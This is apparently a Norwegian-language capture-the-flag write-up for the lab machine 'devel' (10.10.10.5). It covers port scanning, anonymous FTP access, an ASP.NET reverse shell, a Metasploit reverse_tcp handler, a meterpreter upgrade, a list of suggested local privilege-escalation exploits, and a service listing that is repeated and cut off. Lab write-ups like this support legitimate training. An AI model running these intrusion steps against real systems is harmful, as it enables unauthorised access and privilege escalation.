# devel 10.10.10.5

windows maskin

`oot@kali:~# nmap -sS -P0 10.10.10.5`

`Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-26 09:47 EDT`

`Nmap scan report for 10.10.10.5`

`Host is up (0.061s latency).`

`Not shown: 998 filtered ports`

`PORT   STATE SERVICE`

`21/tcp open  ftp`

`80/tcp open  http`

logget inn **ftp **med **anonymous**.   login med -i som fjerner prompts

http kjører iis7

fikk et skikkelig shell med [https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/](https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/)

**windows 7 6.1 build 7600 x86**

**koble et shell rett inn i metasploit og oppgradere til meterpreter**

```
* use multi/handler

* set LHOST attack-machine

* set LPORT port-as-appropraite

* set payload windows/shell/reverse\_tcp

* exploit'
```

background session med ctrl z&lt;

`use post/multi/manage/shell_to_meterpreter`

kan her kjøre kommandoer.

```
net users
```

    Administrator            babis                    Guest**
    ``

    /c whoami = iis apppool\**web**



    **

use post/multi/recon/local\_exploit\_suggester **    
**FORSØKT ALLE DISSE UTEN HELL\*\*

```
\[+\] 10.10.10.5 - exploit/windows/local/bypassuac\_eventvwr: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms10\_015\_kitrap0d: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms10\_092\_schelevator: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms13\_053\_schlamperei: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms13\_081\_track\_popup\_menu: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms14\_058\_track\_popup\_menu: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms15\_004\_tswbproxy: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms15\_051\_client\_copy\_image: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms16\_016\_webdav: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms16\_032\_secondary\_logon\_handle\_privesc: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ppr\_flatten\_rec: The target appears to be vulnerable.
```

getsystem = ingenting

```
wmic qfe get
```

no work :\(

sjekke hvilke prossesser som kjører med admin privelege.

```
use post/windows/gather/enum_patches
```

msf post\(shell\_to\_meterpreter\) &gt; use post/windows/gather/enum\_patches  
msf post\(enum\_patches\) &gt; set session 2  
session =&gt; 2  
msf post\(enum\_patches\) &gt; exploit

\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass    
[-] Call stack:    
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in`run'  
\[\*\] Post module execution completed

msf post\(enum\_patches\) &gt; run

\[-\] Known bug in WMI query, try migrating to another process  
\[\*\] Post module execution completed

msf post\(enum\_services\) &gt; exploit

\[\*\] Listing Service Info for matching services, please wait...  
\[+\] New service credential detected: AeLookupSvc is running as 'localSystem'  
\[+\] New service credential detected: ALG is running as 'NT AUTHORITY\LocalService'  
\[+\] New service credential detected: aspnet\_state is running as 'NT AUTHORITY\NetworkService'

# Services

Name                            Credentials                  Command   Startup

---

ALG                             NT AUTHORITY\LocalService    Manual    C:\Windows\System32\alg.exe  
 AeLookupSvc                     localSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 AppHostSvc                      LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k apphost  
 AppIDSvc                        NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 AppMgmt                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 Appinfo                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 AudioEndpointBuilder            LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 Audiosrv                        NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 AxInstSV                        LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k AxInstSVGroup  
 BDESVC                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 BFE                             NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  
 BITS                            LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 Browser                         LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 COMSysApp                       LocalSystem                  Manual    C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}  
 CertPropSvc                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 CryptSvc                        NT Authority\NetworkService  Auto      C:\Windows\system32\svchost.exe -k NetworkService  
 CscService                      LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 DPS                             NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork  
 DcomLaunch                      LocalSystem                  Auto      %SystemRoot%\system32\svchost.exe -k DcomLaunch  
 Dhcp                            NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted  
 Dnscache                        NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\svchost.exe -k NetworkService  
 EFS                             LocalSystem                  Manual    C:\Windows\System32\lsass.exe  
 EapHost                         localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 EventSystem                     NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService  
 FDResPub                        NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 Fax                             NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\fxssvc.exe  
 FontCache                       NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 FontCache3.0.0.0                NT Authority\LocalService    Manual    C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe  
 HomeGroupListener               LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 HomeGroupProvider               NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 IKEEXT                          LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 KeyIso                          LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 KtmRm                           NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkServiceAndNoImpersonation  
 LanmanServer                    LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 LanmanWorkstation               NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\svchost.exe -k NetworkService  
 MMCSS                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 MSDTC                           NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\msdtc.exe  
 MSiSCSI                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 Mcx2Svc                         NT Authority\LocalService    Disabled  C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 MpsSvc                          NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  
 NetTcpPortSharing               NT AUTHORITY\LocalService    Disabled  "C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\SMSvcHost.exe"  
 Netlogon                        LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 Netman                          LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 NlaSvc                          NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\svchost.exe -k NetworkService  
 PNRPsvc                         NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServicePeerNet  
 PcaSvc                          LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 PeerDistSvc                     NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k PeerDist  
 PlugPlay                        LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch  
 PolicyAgent                     NT Authority\NetworkService  Manual    C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted  
 Power                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch  
 ProfSvc                         LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 ProtectedStorage                LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 RasAuto                         localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 RasMan                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 RemoteAccess                    localSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs  
 RemoteRegistry                  NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k regsvc  
 RpcEptMapper                    NT AUTHORITY\NetworkService  Auto      %SystemRoot%\system32\svchost.exe -k RPCSS  
 RpcLocator                      NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\locator.exe  
 RpcSs                           NT AUTHORITY\NetworkService  Auto      %SystemRoot%\system32\svchost.exe -k rpcss  
 SCPolicySvc                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 SCardSvr                        NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 SDRSVC                          localSystem                  Manual    C:\Windows\system32\svchost.exe -k SDRSVC  
 SENS                            LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 SNMPTRAP                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\snmptrap.exe  
 SamSs                           LocalSystem                  Auto      C:\Windows\system32\lsass.exe  
 Schedule                        LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 SensrSvc                        NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 SessionEnv                      localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 SharedAccess                    LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs  
 ShellHWDetection                LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k netsvcs  
 Spooler                         LocalSystem                  Auto      C:\Windows\System32\spoolsv.exe  
 SstpSvc                         NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 StiSvc                          NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k imgsvc  
 StorSvc                         LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 SysMain                         LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 TBS                             NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceAndNoImpersonation  
 THREADORDER                     NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 TabletInputService              LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 TapiSrv                         NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 TermService                     NT Authority\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 Themes                          LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k netsvcs  
 TrkWks                          LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 TrustedInstaller                localSystem                  Manual    C:\Windows\servicing\TrustedInstaller.exe  
 UI0Detect                       LocalSystem                  Manual    C:\Windows\system32\UI0Detect.exe  
 UmRdpService                    localSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 UxSms                           localSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 VSS                             LocalSystem                  Manual    C:\Windows\system32\vssvc.exe  
 VaultSvc                        LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 W32Time                         NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 W3SVC                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k iissvcs  
 WAS                             LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k iissvcs  
 WMPNetworkSvc                   NT AUTHORITY\NetworkService  Manual    "C:\Program Files\Windows Media Player\wmpnetwk.exe"  
 WPCSvc                          NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted  
 WPDBusEnum                      LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 WSearch                         LocalSystem                  Auto      C:\Windows\system32\SearchIndexer.exe /Embedding  
 WbioSrvc                        LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k WbioSvcGroup  
 WcsPlugInService                NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k wcssvc  
 WdiServiceHost                  NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService  
 WdiSystemHost                   LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 WebClient                       NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 Wecsvc                          NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\svchost.exe -k NetworkService  
 WerSvc                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k WerSvcGroup  
 WinDefend                       LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k secsvcs  
 WinHttpAutoProxySvc             NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 WinRM                           NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 Winmgmt                         localSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 Wlansvc                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 WwanSvc                         NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  
 aspnet\_state                    NT AUTHORITY\NetworkService  Manual    C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet\_state.exe  
 bthserv                         NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k bthsvcs  
 clr\_optimization\_v2.0.50727\_32  LocalSystem                  Manual    C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe  
 defragsvc                       localSystem                  Manual    C:\Windows\system32\svchost.exe -k defragsvc  
 dot3svc                         localSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 ehRecvr                         NT AUTHORITY\networkService  Manual    C:\Windows\ehome\ehRecvr.exe  
 ehSched                         NT AUTHORITY\networkService  Manual    C:\Windows\ehome\ehsched.exe  
 eventlog                        NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 fdPHost                         NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 ftpsvc                          LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k ftpsvc  
 gpsvc                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 hidserv                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 hkmsvc                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 idsvc                           LocalSystem                  Manual    "C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\infocard.exe"  
 iphlpsvc                        LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k NetSvcs  
 lltdsvc                         NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService  
 lmhosts                         NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted  
 msiserver                       LocalSystem                  Manual    C:\Windows\system32\msiexec.exe /V  
 napagent                        NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 netprofm                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService  
 nsi                             NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService  
 p2pimsvc                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServicePeerNet  
 p2psvc                          NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServicePeerNet  
 pla                             NT AUTHORITY\LocalService    Manual    %SystemRoot%\System32\svchost.exe -k LocalServiceNoNetwork  
 seclogon                        LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 sppsvc                          NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\sppsvc.exe  
 sppuinotify                     NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 swprv                           LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k swprv  
 vds                             LocalSystem                  Manual    C:\Windows\System32\vds.exe  
 wbengine                        localSystem                  Manual    "C:\Windows\system32\wbengine.exe"  
 wercplsupport                   localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 wmiApSrv                        localSystem                  Manual    C:\Windows\system32\wbem\WmiApSrv.exe  
 wscsvc                          NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 wuauserv                        LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 wudfsvc                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted

\[+\] Loot file stored in: /root/.msf4/loot/20170530070020\_default\_10.10.10.5\_windows.services\_595828.txt  
\[\*\] Post module execution completed  
msf post\(enum\_services\) &gt; exploit

\[\*\] Listing Service Info for matching services, please wait...  
\[+\] New service credential detected: AeLookupSvc is running as 'localSystem'  
\[+\] New service credential detected: ALG is running as 'NT AUTHORITY\LocalService'  
\[+\] New service credential detected: aspnet\_state is running as 'NT AUTHORITY\NetworkService'

# Services

Name                            Credentials                  Command   Startup

---

ALG                             NT AUTHORITY\LocalService    Manual    C:\Windows\System32\alg.exe  
 AeLookupSvc                     localSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 AppHostSvc                      LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k apphost  
 AppIDSvc                        NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 AppMgmt                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 Appinfo                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 AudioEndpointBuilder            LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 Audiosrv                        NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 AxInstSV                        LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k AxInstSVGroup  
 BDESVC                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 BFE                             NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  
 BITS                            LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 Browser                         LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 COMSysApp                       LocalSystem                  Manual    C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}  
 CertPropSvc                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 CryptSvc                        NT Authority\NetworkService  Auto      C:\Windows\system32\svchost.exe -k NetworkService  
 CscService                      LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 DPS                             NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork  
 DcomLaunch                      LocalSystem                  Auto      %SystemRoot%\system32\svchost.exe -k DcomLaunch  
 Dhcp                            NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted  
 Dnscache                        NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\svchost.exe -k NetworkService  
 EFS                             LocalSystem                  Manual    C:\Windows\System32\lsass.exe  
 EapHost                         localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 EventSystem                     NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService  
 FDResPub                        NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 Fax                             NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\fxssvc.exe  
 FontCache                       NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 FontCache3.0.0.0                NT Authority\LocalService    Manual    C:\Windows\Microsoft.Net\Framework\v3.0\WPF\PresentationFontCache.exe  
 HomeGroupListener               LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 HomeGroupProvider               NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 IKEEXT                          LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 KeyIso                          LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 KtmRm                           NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkServiceAndNoImpersonation  
 LanmanServer                    LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 LanmanWorkstation               NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\svchost.exe -k NetworkService  
 MMCSS                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 MSDTC                           NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\msdtc.exe  
 MSiSCSI                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 Mcx2Svc                         NT Authority\LocalService    Disabled  C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 MpsSvc                          NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  
 NetTcpPortSharing               NT AUTHORITY\LocalService    Disabled  "C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\SMSvcHost.exe"  
 Netlogon                        LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 Netman                          LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 NlaSvc                          NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\svchost.exe -k NetworkService  
 PNRPsvc                         NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServicePeerNet  
 PcaSvc                          LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 PeerDistSvc                     NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k PeerDist  
 PlugPlay                        LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch  
 PolicyAgent                     NT Authority\NetworkService  Manual    C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted  
 Power                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch  
 ProfSvc                         LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 ProtectedStorage                LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 RasAuto                         localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 RasMan                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 RemoteAccess                    localSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs  
 RemoteRegistry                  NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k regsvc  
 RpcEptMapper                    NT AUTHORITY\NetworkService  Auto      %SystemRoot%\system32\svchost.exe -k RPCSS  
 RpcLocator                      NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\locator.exe  
 RpcSs                           NT AUTHORITY\NetworkService  Auto      %SystemRoot%\system32\svchost.exe -k rpcss  
 SCPolicySvc                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 SCardSvr                        NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 SDRSVC                          localSystem                  Manual    C:\Windows\system32\svchost.exe -k SDRSVC  
 SENS                            LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 SNMPTRAP                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\snmptrap.exe  
 SamSs                           LocalSystem                  Auto      C:\Windows\system32\lsass.exe  
 Schedule                        LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 SensrSvc                        NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation  
 SessionEnv                      localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 SharedAccess                    LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs  
 ShellHWDetection                LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k netsvcs  
 Spooler                         LocalSystem                  Auto      C:\Windows\System32\spoolsv.exe  
 SstpSvc                         NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 StiSvc                          NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k imgsvc  
 StorSvc                         LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 SysMain                         LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 TBS                             NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceAndNoImpersonation  
 THREADORDER                     NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 TabletInputService              LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 TapiSrv                         NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 TermService                     NT Authority\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 Themes                          LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k netsvcs  
 TrkWks                          LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 TrustedInstaller                localSystem                  Manual    C:\Windows\servicing\TrustedInstaller.exe  
 UI0Detect                       LocalSystem                  Manual    C:\Windows\system32\UI0Detect.exe  
 UmRdpService                    localSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 UxSms                           localSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 VSS                             LocalSystem                  Manual    C:\Windows\system32\vssvc.exe  
 VaultSvc                        LocalSystem                  Manual    C:\Windows\system32\lsass.exe  
 W32Time                         NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 W3SVC                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k iissvcs  
 WAS                             LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k iissvcs  
 WMPNetworkSvc                   NT AUTHORITY\NetworkService  Manual    "C:\Program Files\Windows Media Player\wmpnetwk.exe"  
 WPCSvc                          NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted  
 WPDBusEnum                      LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 WSearch                         LocalSystem                  Auto      C:\Windows\system32\SearchIndexer.exe /Embedding  
 WbioSrvc                        LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k WbioSvcGroup  
 WcsPlugInService                NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k wcssvc  
 WdiServiceHost                  NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService  
 WdiSystemHost                   LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted  
 WebClient                       NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 Wecsvc                          NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\svchost.exe -k NetworkService  
 WerSvc                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k WerSvcGroup  
 WinDefend                       LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k secsvcs  
 WinHttpAutoProxySvc             NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 WinRM                           NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 Winmgmt                         localSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 Wlansvc                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 WwanSvc                         NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  
 aspnet\_state                    NT AUTHORITY\NetworkService  Manual    C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet\_state.exe  
 bthserv                         NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k bthsvcs  
 clr\_optimization\_v2.0.50727\_32  LocalSystem                  Manual    C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe  
 defragsvc                       localSystem                  Manual    C:\Windows\system32\svchost.exe -k defragsvc  
 dot3svc                         localSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
